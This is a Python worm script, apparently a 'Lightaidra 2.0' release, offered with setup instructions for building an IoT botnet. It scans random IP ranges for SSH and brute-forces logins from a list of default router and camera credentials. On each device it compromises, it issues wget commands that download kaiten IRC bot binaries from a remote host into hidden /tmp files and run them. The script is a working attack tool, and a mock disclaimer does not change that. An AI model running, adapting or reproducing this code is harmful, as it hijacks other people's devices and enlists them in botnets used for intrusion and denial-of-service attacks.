#!/usr/bin/env python
#NOTE This script kind of sucks, please don't ask me questions about it, it's a piece of shit. --shellz
# Updated by shellz, Nov 1, 2016
#~WhitePacket
#Lightaidra sucked, so here's 2.0 - will infect thousands of routers.
# To setup, follow the instructions
#-Download kaiten.c from https://dl.packetstormsecurity.net/irc/kaiten.c (I didn't create kaiten)
#-Cross compile it to sh4, powerpc, mipsel, mips, and armv5l.
#-Put the files in your htdocs directory of a server to host them named something sensible like kaiten-*, wildcard in place of the architecture name.
# Set some stuff on your servers so you don't get capped at 476 open SSH connections.
#-ulimit -n 99999
#-sysctl -w fs.file-max=100000
# Run heavyhidra
#-python infect.py 376 LUCKY x 0
#-python infect.py 376 B 113.53 1
# Donate BTC: 1JiyTFYsubsRzwj8uCtzxRirnr33wGS5YB
#NOTE: I wrote this back when I didn't code professionally, and on Tuesday, September 8th 2015 I decided to officially release it. Don't expect quality code, but working code.
#Disclaimer: use this for code analysis and entertainment purposes only. The code is quite funny, old, works incredibly well and you are completely liable for anything done on it. I do not permit execution of the following code:

import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null") #Prevents paramiko error spam.

files = [ #Files in which we would like to execute upon the routers.
    "ktx-sh4",
    "ktx-powerpc",
    "ktx-mipsel",
    "ktx-mips",
    "ktx-armv5l",
    "ktx-i686",
    "ktx-m68k",
    "ktx-sparc",
    "ktx-x86_64"
]

website = "lol.com" #Public facing IP hosting the IRC bot binaries.

reservedips = [ #Majestic list of reserved IP's we have no reason to scan. Actually quite dull.
 'http://127.',
 'http://0',
 'http://10.',
 'http://172.16.'
 'http://224.',
 'http://225'
]

passwords = [ #Some default SSH logins.
    "666666:666666",
    "888888:888888",
    "admin:1111",
    "admin:1111111",
    "admin:1234",
    "admin:12345",
    "admin:123456",
    "admin1:password",
    "admin:54321",
    "admin:7ujMko0admin",
    "admin:admin",
    "admin:admin1234",
    "administrator:1234",
    "Administrator:admin",
    "admin:meinsm",
    "admin:(none)",
    "admin:pass",
    "admin:password",
    "admin:smcadmin",
    "guest:12345",
    "guest:guest",
    "root:00000000",
    "root:1111",
    "root1111",
    "root:1234",
    "root:12345",
    "root:123456",
    "root:123qwe",
    "root:1q2w3e",
    "root:1q2w3e4r5t",
    "root:54321",
    "root:666666",
    "root:7ujMko0admin",
    "root:7ujMko0vizxv",
    "root:888888",
    "root:admin",
    "root:anko",
    "root:default",
    "root:dreambox",
    "root:ferrari",
    "root:hi3518",
    "root:ikwb",
    "root:juantech",
    "root:jvbzd",
    "root:klv123",
    "root:klv1234",
    "root:(none)",
    "root:pass",
    "root:password",
    "root:qwerty"
    "root:realtek",
    "root:redtube",
    "root:root",
    "root:root", 
    "root:system",
    "root:test",
    "root:toor",
    "root:user",
    "root:vizxv",
    "root:xc3511",
    "root:xmhdipc",
    "root:zlxx.",
    "root:Zte521",
    "service:service",
    "supervisor:supervisor",
    "support:support",
    "tech:tech",
    "test:test",
    "ubnt:ubnt",
    "user:user"


]

print sys.argv[0]+' Threads[max 376] A/B/C(ip class) /RAND IPHERE(1/1.1/1.1.1) 0/1 (password list, root:root) (doesn\'t scan recursively)' #Lack of basic system arguments/coded two years ago. Don't hate.

if sys.argv[4] == '1':
    passwords = [ "root:root" ] #Faster exploitation with somewhat less results.

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = 'http://'+ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = 'http://'+ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = 'http://'+ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY":
                        lucky = ["186.115","31.176","113.53","186.113","190.254","190.255","186.114","95.9","95.6","118.174","190.65","203.249","190.66","190.67","122.176","187.109","60.51","186.119","95.169","190.69","190.253","122.168","201.75","117.156","188.59","177.11","182.74","190.68","118.173","190.252","165.229","84.122"]
                        self.host = 'http://'+random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    else:
                        self.host = 'http://'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in reservedips:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                self.host=self.host.replace('http://', '') #This could be optimized. This is bad code. No idea why I did it like this.
                username='root'
                password="0"
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                websites = [ ]
                for theFile in files:
                    websites.append("wget http://"+website+"/ktx/"+theFile+" -O /tmp/."+theFile+"; chmod +x /tmp/."+theFile+"; /tmp/."+theFile+" &") #Save it as a hidden file, of course.
                if badserver == False:
                        print 'Infected: '+username+'<'+password+'>'+self.host+'|'+str(port)
                        for web in websites:
                            for a in ["wget", "wget1"]:
                                try:
                                    ssh.exec_command(web.replace("wget",a))
                                except:
                                    pass
                ssh.close()
            except:
                pass

for x in range(0,int(sys.argv[1])): #This may abuse your system resources and anger network administrators.
    try:
        t = sshscanner()
        t.start()
    except:
        pass
